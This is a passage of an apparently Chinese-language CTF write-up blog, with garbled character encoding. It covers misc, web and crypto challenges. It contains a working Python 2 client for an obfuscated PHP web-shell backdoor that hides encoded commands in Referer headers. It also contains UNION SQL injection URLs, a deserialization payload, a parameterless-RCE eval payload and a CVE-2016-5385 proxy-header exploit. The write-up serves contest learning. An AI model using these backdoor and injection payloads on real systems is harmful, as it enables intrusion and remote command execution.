class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choicePart</span>(<span class="params">seq, amount</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> length &lt; amount:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error Input&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    result = []</span><br><span class="line">    indexes = []</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt; amount:</span><br><span class="line">        i = randint(<span class="number">0</span>, length - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">            indexes.append(i)</span><br><span class="line">            result.append(seq[i])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == amount:</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randBytesFlow</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += <span class="built_in">chr</span>(randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randAlpha</span>(<span class="params">amount</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(amount):</span><br><span class="line">        result += choice(string.ascii_letters)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loopXor</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    lenKey = <span class="built_in">len</span>(key)</span><br><span class="line">    lenTxt = <span class="built_in">len</span>(text)</span><br><span class="line">    iTxt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> iTxt &lt; lenTxt:</span><br><span class="line">        iKey = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> iTxt &lt; lenTxt <span class="keyword">and</span> iKey &lt; lenKey:</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[iKey]) ^ <span class="built_in">ord</span>(text[iTxt]))</span><br><span class="line">            iTxt += <span class="number">1</span></span><br><span class="line">            iKey += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debugPrint</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">if</span> debugging:</span><br><span class="line">        <span class="built_in">print</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">debugging = <span class="literal">False</span></span><br><span class="line">keyh = <span class="string">&quot;3481&quot;</span>  <span class="comment"># $kh</span></span><br><span class="line">keyf = <span class="string">&quot;9d7b&quot;</span>  <span class="comment"># $kf</span></span><br><span class="line">xorKey = keyh + keyf</span><br><span class="line">url = <span class="string">&#x27;http://42.192.64.28:8083/shell.php&#x27;</span></span><br><span class="line">defaultLang = <span class="string">&#x27;zh-CN&#x27;</span></span><br><span class="line">languages = [<span class="string">&#x27;zh-TW;q=0.%d&#x27;</span>, <span class="string">&#x27;zh-HK;q=0.%d&#x27;</span>, <span class="string">&#x27;en-US;q=0.%d&#x27;</span>, <span class="string">&#x27;en;q=0.%d&#x27;</span>]</span><br><span class="line">proxies = <span class="literal">None</span>  <span class="comment"># &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # proxy for debug</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random Accept-Language only once each session</span></span><br><span class="line">langTmp = choicePart(languages, <span class="number">3</span>)</span><br><span class="line">indexes = <span class="built_in">sorted</span>(choicePart(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>), <span class="number">3</span>), reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">acceptLang = [defaultLang]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    acceptLang.append(langTmp[i] % (indexes[i],))</span><br><span class="line">acceptLangStr = <span class="string">&#x27;,&#x27;</span>.join(acceptLang)</span><br><span class="line">debugPrint(acceptLangStr)</span><br><span class="line"></span><br><span class="line">init2Char = acceptLang[<span class="number">0</span>][<span class="number">0</span>] + acceptLang[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># $i</span></span><br><span class="line">md5head = (md5(init2Char + keyh).hexdigest())[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">md5tail = (md5(init2Char + keyf).hexdigest())[<span class="number">0</span>:<span class="number">3</span>] + randAlpha(randint(<span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line">debugPrint(<span class="string">&#x27;$i is %s&#x27;</span> % (init2Char))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 head: %s&#x27;</span> % (md5head,))</span><br><span class="line">debugPrint(<span class="string">&#x27;md5 tail: %s&#x27;</span> % (md5tail,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive php shell</span></span><br><span class="line">cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> cmd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">    <span class="comment"># build junk data in referer</span></span><br><span class="line">    query = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">max</span>(indexes) + <span class="number">1</span> + randint(<span class="number">0</span>, <span class="number">2</span>)):</span><br><span class="line">        key = randAlpha(randint(<span class="number">3</span>, <span class="number">6</span>))</span><br><span class="line">        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="number">3</span>, <span class="number">12</span>)))</span><br><span class="line">        query.append((key, value))</span><br><span class="line">    debugPrint(<span class="string">&#x27;Before insert payload:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(urllib.urlencode(query))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encode payload</span></span><br><span class="line">    payload = zlib.compress(cmd)</span><br><span class="line">    payload = loopXor(payload, xorKey)</span><br><span class="line">    payload = base64.urlsafe_b64encode(payload)</span><br><span class="line">    payload = md5head + payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cut payload, replace into referer</span></span><br><span class="line">    cutIndex = randint(<span class="number">2</span>, <span class="built_in">len</span>(payload) - <span class="number">3</span>)</span><br><span class="line">    payloadPieces = (payload[<span class="number">0</span>:cutIndex], payload[cutIndex:], md5tail)</span><br><span class="line">    iPiece = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> indexes:</span><br><span class="line">        query[i] = (query[i][<span class="number">0</span>], payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">&#x27;?&#x27;</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">&#x27;After insert payload, referer is:&#x27;</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url, headers=&#123;<span class="string">&#x27;Accept-Language&#x27;</span>: acceptLangStr, <span class="string">&#x27;Referer&#x27;</span>: refe                                                                                   rer&#125;, proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27;</span> % (xorKey, xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Error,  no backdoor response&#x27;</span></span><br><span class="line">        cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    output = loopXor(output, xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="built_in">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">&#x27;phpshell &gt; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ”¹æ‰ä¸­é—´çš„urlå’Œkeyå°±å¯ä»¥äº†ï¼Œpy2çš„<br><img src="/images/tjuctf/6.png" alt="image-20220124201741117"><br>ç›´æ¥æ‰“å°±è¡Œäº†ï¼Œå…·ä½“åŸå› å˜›ï¼Œè¿˜éœ€è¦ç»§ç»­ç ”ç©¶ç ”ç©¶</p><h5 id="è¿™ä¸ªdocä¸å¯¹åŠ²"><a href="#è¿™ä¸ªdocä¸å¯¹åŠ²" class="headerlink" title="è¿™ä¸ªdocä¸å¯¹åŠ²"></a>è¿™ä¸ªdocä¸å¯¹åŠ²</h5><p>è¿™ä¸ªé¢˜å¥½ç©ï¼Œæ¯”è¾ƒæœ‰è¶£ï¼Œä½†æ˜¯ä¸­é—´å‡ºç°äº†ä¸€äº›æ„å¤–ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…<br>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸ªdocï¼Œæ˜¾ç„¶60M+çš„docä¸å¤ªç°å®ï¼Œç›´æ¥æ”¹æˆzipåŒ…<br>æœ‰ä¸€ä¸ªkey.txtï¼Œé¢„è§ˆçœ‹ä¸å¤ªæ­£å¸¸ï¼Œå¯èƒ½æ˜¯0å®½ï¼Œç½‘ç«™æ‰“ä¸€ä¸‹<br><img src="/images/tjuctf/7.png" alt="image-20220124202818555"><br>åˆšå¼€å§‹ä»¥ä¸ºè¦æ©ç çˆ†ç ´ï¼Œä½†æ˜¯æ²¡è·‘å‡ºæ¥ï¼Œé—®äº†ä¸‹å‡ºé¢˜äººï¼Œé¢˜æœ‰äº›é—®é¢˜ï¼Œç›´æ¥ç»™å¯†ç äº†è§£ä¸€ä¸‹å‹ç¼©åŒ…<br><code>Because I like naruto best</code><br>è§£ä¸€ä¸‹å‹ç¼©åŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šå›¾ç‰‡ï¼Œä¸€å…±129488å¼ ï¼Œçœ‹å°å›¾ç‰‡æ˜¯ä¸¤ç§ä¸ä¸€æ ·çš„å›¾ç‰‡ï¼Œç›²çŒœè½¬01ï¼Œå…«ä¸ªä¸ºä¸€ä½ï¼Œè½¬asciiè½¬å‡ºæ¥å°±å¯ä»¥äº†ï¼Œäººå·¥è‚¯å®šä¸ç°å®ï¼Œè´´ä¸€ä¸‹è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a = 104329</span></span><br><span class="line"><span class="comment"># for i in range(300,400):</span></span><br><span class="line"><span class="comment">#     if int(i)*int(i)==a:</span></span><br><span class="line"><span class="comment">#         print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> asyncore <span class="keyword">import</span> write</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fi = <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\ctf\\tj\\tjtest.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130000</span>):</span><br><span class="line">    <span class="comment">#å…«ä¸ªä¸ºä¸€ç»„å…«ä¸ªåè¾“å‡ºå›è½¦</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(i)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#è¯»å–æ‰€æœ‰æ–‡ä»¶å¤¹ä¸‹å›¾ç‰‡ï¼Œæ ¹æ®getsizeåˆ¤æ–­</span></span><br><span class="line">    a=os.path.getsize(<span class="string">&#x27;C:\\Users\\xin\\Desktop\\love\\out\\&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">262</span>:</span><br><span class="line">        fi.write(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        fi.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">fi.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tj\\tjtest.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        i = i.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯getsizeæ˜¯åˆ¤æ–­å›¾ç‰‡çš„å­—èŠ‚<br><img src="/images/tjuctf/8.png" alt="image-20220124203834234"><br>è¿è¡Œå‡ºæ¥ï¼Œæ˜¯base64å›¾ç‰‡ï¼Œç›´æ¥å¤åˆ¶åˆ°æµè§ˆå™¨å°±å¥½äº†<br><img src="/images/tjuctf/9.png" alt="image-20220124204133045"><br><img src="/images/tjuctf/10.png" alt="image-20220125181954185"><br>è¾“å‡ºçš„ä¸œè¥¿ç›´æ¥æ”¾åˆ°æµè§ˆå™¨è¿è¡Œå°±å¯ä»¥äº†</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h5><p>sqlæ³¨å…¥æ²¡æœ‰ä»»ä½•è¿‡æ»¤,ç›´æ¥æ‰“å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(schema_name),version(),version() from information_schema.schemata-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(table_name),version(),version() from information_schema.tables where table_schema=&#x27;CTF&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),group_concat(column_name),version(),version() from information_schema.columns where table_schema=&#x27;CTF&#x27; and table_name=&#x27;flag&#x27;-- -</span><br><span class="line">http://123.56.40.11/sql.php?id=-1 union select version(),flag,null,null from CTF.flag-- -</span><br></pre></td></tr></table></figure><h5 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h5><p>æ–‡ä»¶ä¸Šä¼ ï¼Œå‰ç«¯æ£€æµ‹ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªpngå›¾ç‰‡æŠ“åŒ…ï¼Œç„¶åæ”¹åç¼€ï¼Œcat  /flagå³å¯<br><img src="/images/tjuctf/11.png" alt="image-20220125194611835"></p><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h5><p>ctfshowååºåˆ—åŒ–åŸé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬,<img src="/images/tjuctf/12.png" alt="image-20220125195719749"><br>æ‰“ä¸€ä¸‹å°±å¯ä»¥äº†,è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹urlç¼–ç ä¸€ä¸‹</p><h5 id="RCE-fun"><a href="#RCE-fun" class="headerlink" title="RCE_fun"></a>RCE_fun</h5><p>emmm  ä¸ä¼šï¼Œåæ¥çœ‹äº†ä¸‹wpï¼Œemmmè¿˜å¯ä»¥è¿™æ ·  ä»¥ä¸ºæ˜¯åŸé¢˜ï¼Œåé¢ç ”ç©¶ä¸€ä¸‹</p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="modulus"><a href="#modulus" class="headerlink" title="modulus"></a>modulus</h5><p>ç»™äº†ä¸€ä¸ªå¤§nï¼Œe1å’Œe2ï¼Œc1ï¼Œc2ï¼Œå…±æ¨¡æ”»å‡»ç›´æ¥ä¸€æŠŠæ¢­<br><img src="/images/tjuctf/13.png" alt="image-20220125200608676"></p><h4 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h4><p>emmmm ä¸èƒ½ç®—åšå‡ºæ¥å§ï¼Œç›´æ¥è½¯ä»¶ä¸€æŠŠæ¢­çš„ï¼Œ<br><img src="/images/tjuctf/14.png" alt=" "></p><p><img src="/images/tjuctf/15.png" alt="image-20220125193800648"></p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>å¤ªèœäº†ï¼Œcscmsæ²¡åšå‡ºæ¥ï¼Œä¸­é—´æœäº†ä¸€ä¸ªä¸Šä¼ æ¼æ´çœ‰ä¹Ÿæ²¡æœ‰æ‰“é€šï¼Œå°±æ²¡ç®¡äº†ã€‚<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿å®‰æˆ˜ç–«ç½‘ç»œå®‰å…¨å«å£«å®ˆæŠ¤èµ›</title>
      <link href="/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
      <url>/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™äº†æºç ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123; </code>è¿™é‡Œæ­£åˆ™åŒ¹é…äº†è¾“å…¥çš„codeå­—ç¬¦ï¼Œæœ‰å‚æ•°å°±ä¼šæ›¿æ¢ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥<code>?code=phpinfo();</code>å°±ä¼šæ˜¾ç¤ºphpinfoä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœ<code>system(&#39;ls&#39;);</code>è¿™æ ·å°±ä¼šè¢«è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ‹¬å·é‡Œä¸èƒ½æœ‰å‚æ•°ï¼Œå¯ä»¥è¿™æ ·<code>a(b())</code>,ä½†æ˜¯ä¸èƒ½è¿™æ ·<code>a(&#39;b&#39;)</code>ï¼Œå°±æ˜¯æ— å‚æ•°rceã€‚<br>è¿™è¾¹æˆ‘çœ‹åˆ°é¢˜<code>if(!preg_match(&#39;/session|end|next|header|dir/i&#39;,$_GET[&#39;code&#39;]))&#123;</code><br>å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ­£å¸¸æˆ‘ä»¬æœ‰ä¸¤ç§é€‰æ‹©ä¸€ç§rceï¼Œä¸€ç§æ–‡ä»¶è¯»å–ï¼Œ<br>é¢˜ç›®ä¹Ÿç»™æˆ‘ä»¬äº† æç¤ºrceï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†endï¼Œheaderï¼Œsessionï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨<code>get_defined_vars ()</code>å‡½æ•°<br>get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br><img src="/images/changanzhanyi/1.png" alt="1"><br>getä¼ å‚åæ•°ç»„é‡Œå°±ä¼šæœ‰getä¼ é€’çš„å€¼</p><p>current : è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œæ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒâ€œå½“å‰çš„â€å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚</p><p>å’Œcurrentç±»ä¼¼çš„å‡½æ•°<br>end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>a=eval(end(current(get_defined_vars())));&amp;b=phpinfo();<br>æ„é€ payload<br>è¿™é‡Œè¿‡æ»¤äº†end  æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨resetä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ <br>æŠŠä¼ é€’çš„å‚æ•°å†™å‰é¢ï¼Œè¿™æ ·<code>a=phpinfo();&amp;code=eval(reset(current(get_defined_vars())))</code><br>éšä¾¿ä¼ ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¦æ”¾åœ¨æœ€å‰é¢è¿™æ ·çš„è¯å°±å¯ä»¥è¿›è¡Œrceäº†<br><img src="/images/changanzhanyi/2.png" alt="image-20220118141207013"></p><h5 id="flagé…é€ä¸­å¿ƒ"><a href="#flagé…é€ä¸­å¿ƒ" class="headerlink" title="flagé…é€ä¸­å¿ƒ"></a>flagé…é€ä¸­å¿ƒ</h5><p>emmmmå¤ªèœäº†  ä¸ä¼šï¼Œå³é”®æºä»£ç æœ‰æç¤ºï¼Œ<!--Powered by PHP 5.6.23 + fastcgi--><br>å¤ç°ä¸€ä¸‹ï¼Œ<code>CVE-2016-5385 </code><br>æŠ“åŒ…ï¼ŒåŒ…é‡ŒåŠ ä¸Š<code>Proxy: http://xxx.xxx.xxx.xxx:xxxx/</code><br>å°±å¯ä»¥äº†ï¼Œvpsç›‘å¬ä¸€ä¸‹ï¼Œè¯¦ç»†ï¼Œç™¾åº¦ cve-2016-5385<br><img src="/images/changanzhanyi/31.png" alt="image-20220120164323864"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="è¥¿å®‰åŠ æ²¹"><a href="#è¥¿å®‰åŠ æ²¹" class="headerlink" title="è¥¿å®‰åŠ æ²¹"></a>è¥¿å®‰åŠ æ²¹</h5><p>æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæ”¾åˆ°networkæµé‡çœ‹åˆ°æœ‰ä¸€ä¸ªsecret.txtå’Œhint.txtçš„æµé‡åŒ…ä¸ä¸€æ ·å¤§ï¼Œç›´æ¥å³é”®æå‡ºæ¥ï¼Œ<br><img src="/images/changanzhanyi/3.png" alt="image-20220118151527186"><br><img src="/images/changanzhanyi/4.png" alt="image-20220118151613193"><br><img src="/images/changanzhanyi/5.png" 